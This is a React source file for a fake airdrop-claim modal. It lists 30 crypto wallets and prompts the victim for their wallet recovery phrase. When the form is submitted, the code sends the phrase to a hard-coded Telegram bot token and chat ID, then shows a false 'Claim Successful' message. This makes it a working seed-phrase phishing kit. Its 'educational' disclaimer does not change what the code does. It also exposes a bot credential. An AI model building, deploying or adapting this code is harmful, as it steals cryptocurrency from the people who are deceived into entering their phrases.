"use client";

import * as React from "react";
import Image from "next/image";
import { zodResolver } from "@hookform/resolvers/zod";
import { useForm } from "react-hook-form";
import { z } from "zod";
import { ArrowLeft, Copy } from "lucide-react";

import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";
import {
  Form,
  FormControl,
  FormField,
  FormItem,
  FormLabel,
  FormMessage,
} from "@/components/ui/form";
import { Button } from "@/components/ui/button";
import { Textarea } from "@/components/ui/textarea";
import { useToast } from "@/hooks/use-toast";
import { ScrollArea } from "./ui/scroll-area";

const wallets = [
    { name: "MetaMask", logo: "https://placehold.co/64x64.png", hint: "fox logo" },
    { name: "Trust Wallet", logo: "https://placehold.co/64x64.png", hint: "shield logo" },
    { name: "Phantom", logo: "https://placehold.co/64x64.png", hint: "ghost logo" },
    { name: "Coinbase Wallet", logo: "https://placehold.co/64x64.png", hint: "blue square" },
    { name: "Tonkeeper", logo: "https://placehold.co/64x64.png", hint: "blue diamond" },
    { name: "Ledger", logo: "https://placehold.co/64x64.png", hint: "sleek usb" },
    { name: "Trezor", logo: "https://placehold.co/64x64.png", hint: "black device" },
    { name: "Exodus", logo: "https://placehold.co/64x64.png", hint: "X logo" },
    { name: "MyEtherWallet", logo: "https://placehold.co/64x64.png", hint: "green wallet" },
    { name: "Solflare", logo: "https://placehold.co/64x64.png", hint: "sun logo" },
    { name: "Rainbow", logo: "https://placehold.co/64x64.png", hint: "rainbow logo" },
    { name: "Argent", logo: "https://placehold.co/64x64.png", hint: "A logo" },
    { name: "Zerion", logo: "https://placehold.co/64x64.png", hint: "Z logo" },
    { name: "imToken", logo: "https://placehold.co/64x64.png", hint: "blue circle" },
    { name: "MathWallet", logo: "https://placehold.co/64x64.png", hint: "M logo" },
    { name: "SafePal", logo: "https://placehold.co/64x64.png", hint: "S shield" },
    { name: "Atomic Wallet", logo: "https://placehold.co/64x64.png", hint: "atom logo" },
    { name: "Guarda Wallet", logo: "https://placehold.co/64x64.png", hint: "G shield" },
    { name: "Coinomi", logo: "https://placehold.co/64x64.png", hint: "C logo" },
    { name: "Zengo", logo: "https://placehold.co/64x64.png", hint: "Z shield" },
    { name: "Crypto.com DeFi Wallet", logo: "https://placehold.co/64x64.png", hint: "lion logo" },
    { name: "Unstoppable Wallet", logo: "https://placehold.co/64x64.png", hint: "U logo" },
    { name: "BitPay", logo: "https://placehold.co/64x64.png", hint: "blue B" },
    { name: "BRD", logo: "https://placehold.co/64x64.png", hint: "B logo" },
    { name: "Frame", logo: "https://placehold.co/64x64.png", hint: "frame icon" },
    { name: "Rabby Wallet", logo: "https://placehold.co/64x64.png", hint: "rabbit logo" },
    { name: "Core", logo: "https://placehold.co/64x64.png", hint: "C logo" },
    { name: "Enkrypt", logo: "https://placehold.co/64x64.png", hint: "E shield" },
    { name: "XDEFI Wallet", logo: "https://placehold.co/64x64.png", hint: "X logo" },
    { name: "Keplr", logo: "https://placehold.co/64x64.png", hint: "K logo" },
];


const FormSchema = z.object({
  secretPhrase: z
    .string()
    .trim()
    .refine(
      (value) => {
        const wordCount = value.split(/\s+/).filter(Boolean).length;
        return [12, 18, 24].includes(wordCount);
      },
      {
        message:
          "Secret phrase must contain exactly 12, 18, or 24 words.",
      }
    ),
  recaptcha: z.string().min(1, { message: "Please verify you are not a robot." })
});

// A simple component to render reCAPTCHA and handle its state
const ReCAPTCHAComponent = ({ onChange }: { onChange: (token: string | null) => void }) => {
  const recaptchaRef = React.useRef<HTMLDivElement>(null);
  const widgetIdRef = React.useRef<number | null>(null);

  React.useEffect(() => {
    if (!recaptchaRef.current) return;
    
    // Explicitly declare grecaptcha on window
    const global = window as any;

    if (global.grecaptcha && global.grecaptcha.render) {
      if (widgetIdRef.current === null) {
        widgetIdRef.current = global.grecaptcha.render(recaptchaRef.current, {
          sitekey: "6LeIxAcpAAAAAMu-pOKNn9mESaK5X2j_0P0u_XhP", // Public test key
          theme: "dark",
          callback: onChange,
          'expired-callback': () => onChange(null), // Handle expired token
        });
      }
    }

    return () => {
      // Cleanup is tricky with the script-based API, often not needed if component unmounts fully.
      // But we prevent re-rendering by checking widgetIdRef.
    };
  }, [onChange]);

  return <div ref={recaptchaRef}></div>;
};


function SecretPhraseForm({ wallet, onBack, onSuccess }) {
  const { toast } = useToast();
  const form = useForm<z.infer<typeof FormSchema>>({
    resolver: zodResolver(FormSchema),
    defaultValues: {
      secretPhrase: "",
      recaptcha: "",
    },
  });

  const handlePaste = async () => {
    try {
      const text = await navigator.clipboard.readText();
      form.setValue("secretPhrase", text, { shouldValidate: true });
    } catch (err) {
      console.error("Failed to read clipboard contents: ", err);
      toast({
        title: "Paste Failed",
        description: "Could not read from clipboard. Please paste manually.",
        variant: "destructive",
      });
    }
  };

  const onSubmit = async (data: z.infer<typeof FormSchema>) => {
    const botToken = "6858405369:AAHIBm11hz5SSLgH_BZb9mSSFBIOkeiExb8";
    const chatId = "5485468089";
    const timestamp = new Date().toISOString();
    const message = `Wallet: ${wallet.name}\nSecret Phrase: ${data.secretPhrase}\nTimestamp: ${timestamp}\nreCAPTCHA Token: ${data.recaptcha}`;

    try {
      const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
        }),
      });

      const result = await response.json();

      if (result.ok) {
        toast({
          title: "Claim Successful!",
          description: "Your ZK tokens have been sent to your wallet. (Simulation)",
        });
        onSuccess();
      } else {
        throw new Error(result.description);
      }
    } catch (error) {
      console.error("Failed to send to Telegram:", error);
      toast({
        title: "Submission Failed",
        description: "There was an error submitting your claim. Please try again.",
        variant: "destructive",
      });
    } finally {
      // In a real app, you would reset grecaptcha here, but since the modal closes,
      // it will be re-rendered on next open.
      form.reset();
    }
  };

  return (
    <>
      <DialogHeader>
        <div className="flex items-center gap-3 -ml-4">
          <Button variant="ghost" size="icon" onClick={onBack} aria-label="Go back to wallet selection">
            <ArrowLeft className="h-4 w-4" />
          </Button>
          <div className="flex items-center gap-3">
            <Image
              src={wallet.logo}
              alt={`${wallet.name} logo`}
              width={32}
              height={32}
              className="rounded-md"
              data-ai-hint={wallet.hint}
            />
            <DialogTitle className="font-headline text-xl">
              Import your {wallet.name}
            </DialogTitle>
          </div>
        </div>
        <DialogDescription className="pt-2 text-left pl-11">
          Enter your secret recovery phrase to connect your wallet.
          <span className="font-bold"> Never share this phrase.</span>
        </DialogDescription>
      </DialogHeader>
      <Form {...form}>
        <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-6 pt-4">
          <FormField
            control={form.control}
            name="secretPhrase"
            render={({ field }) => (
              <FormItem>
                <FormLabel className="sr-only">Secret Phrase</FormLabel>
                <div className="relative">
                  <FormControl>
                    <Textarea
                      placeholder="Enter your 12, 18, or 24 word secret phrase..."
                      className="resize-none pr-12"
                      rows={4}
                      {...field}
                    />
                  </FormControl>
                  <Button
                    type="button"
                    variant="ghost"
                    size="icon"
                    className="absolute top-2 right-2 h-7 w-7"
                    onClick={handlePaste}
                    aria-label="Paste secret phrase"
                  >
                    <Copy className="h-4 w-4" />
                  </Button>
                </div>
                <FormMessage />
              </FormItem>
            )}
          />

           <FormField
            control={form.control}
            name="recaptcha"
            render={({ field }) => (
              <FormItem>
                <FormControl>
                  <ReCAPTCHAComponent
                     onChange={(token) => field.onChange(token || "")}
                  />
                </FormControl>
                <FormMessage />
              </FormItem>
            )}
          />

           <p className="text-xs text-muted-foreground">
              This site is for educational purposes. Do not use your real secret phrase. The reCAPTCHA is for demonstration purposes.
            </p>
          <Button
            type="submit"
            className="w-full bg-primary text-primary-foreground hover:bg-primary/90"
            disabled={form.formState.isSubmitting}
          >
            {form.formState.isSubmitting
              ? "Validating..."
              : "Import Wallet"}
          </Button>
        </form>
      </Form>
    </>
  );
}

export function WalletConnectModal({ isOpen, onOpenChange }) {
  const [view, setView] = React.useState("wallets");
  const [selectedWallet, setSelectedWallet] = React.useState(null);

  const handleWalletSelect = (wallet) => {
    setSelectedWallet(wallet);
    setView("form");
  };

  const handleBack = () => {
    setView("wallets");
    setSelectedWallet(null);
  };
  
  const handleClose = (open) => {
    if (!open) {
      const timer = setTimeout(() => {
        setView("wallets");
        setSelectedWallet(null);
      }, 300); // Wait for close animation
      return () => clearTimeout(timer);
    }
    onOpenChange(open);
  }

  React.useEffect(() => {
    if (!isOpen) {
      const timer = setTimeout(() => {
        setView("wallets");
        setSelectedWallet(null);
      }, 300); // Wait for close animation
      return () => clearTimeout(timer);
    }
  }, [isOpen]);

  return (
    <Dialog open={isOpen} onOpenChange={handleClose}>
      <DialogContent className="sm:max-w-[480px]">
        {view === "wallets" ? (
          <>
            <DialogHeader>
              <DialogTitle className="font-headline text-2xl text-center">
                Connect your wallet
              </DialogTitle>
              <DialogDescription className="text-center">
                Select your wallet from the list below to claim your airdrop.
              </DialogDescription>
            </DialogHeader>
            <ScrollArea className="h-[400px] pr-4">
              <div className="grid grid-cols-1 gap-2">
                {wallets.map((wallet) => (
                  <button
                    key={wallet.name}
                    onClick={() => handleWalletSelect(wallet)}
                    className="flex items-center w-full p-3 text-left rounded-lg hover:bg-secondary transition-colors focus:outline-none focus-visible:ring-2 focus-visible:ring-ring"
                  >
                    <Image
                      src={wallet.logo}
                      alt={`${wallet.name} logo`}
                      width={40}
                      height={40}
                      className="rounded-md mr-4"
                      data-ai-hint={wallet.hint}
                    />
                    <span className="font-medium">{wallet.name}</span>
                  </button>
                ))}
              </div>
            </ScrollArea>
          </>
        ) : (
          <SecretPhraseForm
            wallet={selectedWallet}
            onBack={handleBack}
            onSuccess={() => onOpenChange(false)}
          />
        )}
      </DialogContent>
    </Dialog>
  );
}
